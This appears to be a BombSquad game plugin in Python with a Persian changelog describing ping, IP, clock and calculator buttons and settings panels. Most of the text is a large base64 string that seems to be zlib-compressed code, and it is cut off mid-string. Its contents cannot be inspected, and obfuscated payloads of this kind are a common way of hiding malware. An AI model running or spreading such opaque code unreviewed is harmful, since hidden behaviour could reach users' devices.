# ModPoya.py - API 9
# ساخته شده توسط StudioBon
# StudioBon
#
# --- آپدیت‌های این نسخه ---
# 1) دکمه‌ی ساعت: حالا تاریخ شمسی هم می‌فرسته و کنار ساعت از ☀️ (روز) یا 🌑 (شب) استفاده می‌کنه.
# 2) یه مود «ماشین حساب حرفه‌ای» اضافه شد: دکمه‌ی چهارم (Calc) یه پنل وسط صفحه باز می‌کنه،
#    همه‌ی دکمه‌ها (اعداد، عملگرها، تایید، بستن) داخل خود پنل هستن، پشت پنل هم چیز اضافه‌ای کشیده نمیشه.
#    برای ارسال نتیجه به چت باید دکمه‌ی «=» رو دو بار پشت سر هم بزنی (بار اول محاسبه می‌کنه، بار دوم می‌فرسته).
# 3) تنظیمات رنگ آیکون‌ها (پس‌زمینه + نوشته‌ی هر ۴ دکمه) اضافه شد و از داخل خود بازی قابل تغییره؛
#    دیگه لازم نیست برای تغییر رنگ‌ها این فایل پایتون رو باز/ویرایش کنی.
#    برای بازکردنش: توی صفحه‌ی افزونه‌ها (Plugins) روی همین مود بزن، دکمه‌ی «تنظیمات» که کنارش
#    ظاهر میشه رو بزن (دقیقاً مثل چیزی که برای ModPiyamPoya.SmartChatSplitter می‌بینی).
#    هیچ دکمه‌ی پنجمی به پنجره‌ی پارتی اضافه نشده.
# 4) دکمه‌های تنظیمات رنگ بزرگ‌تر و با فاصله‌ی بیشتر شدن (راحت‌تر لمس میشن) و کل پنل
#    اسکرول‌پذیره تا هر چندتا دکمه/رنگ بعداً اضافه بشه، جا داشته باشه بدون تغییر طراحی.
#    همچنین یه «هاب تنظیمات» اضافه شد: دکمه‌ی «تنظیمات» حالا اول یه لیست شماره‌دار نشون
#    می‌ده (فعلاً فقط «۱. رنگ آیکون‌ها») و هر پنل تنظیماتِ جدیدی که بعداً اضافه بشه،
#    خودکار به‌صورت «۲.»، «۳.» و... کنارش قرار می‌گیره.
# 5) پنل تنظیماتِ جدید «۲. جا / اندازه / شکل آیکون‌ها» اضافه شد: از همینجا می‌تونی
#    موقعیت (X/Y)، اندازه و شکلِ هر ۴ دکمه (Ping/IP/Time/Calc) رو بین مربع و مستطیل
#    عوض کنی (این نسخه از بازی از دکمه‌ی دایره‌ای پشتیبانی نمی‌کنه، برای همین حذف
#    شد). تغییرات هم ذخیره میشن، هم جا/اندازه فوری روی پنجره‌ی بازِ پارتی اعمال میشن.

from __future__ import annotations

import re
import socket
import threading
import time
import weakref

import babase
import bauiv1 as bui
import bascenev1 as bs
from babase import Plugin
from bauiv1 import buttonwidget as bw, apptimer as teck, screenmessage as push, get_special_widget as gsw
from bauiv1lib import party

import base64 as _b64
import zlib as _zlib

_PAYLOAD = (    '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'
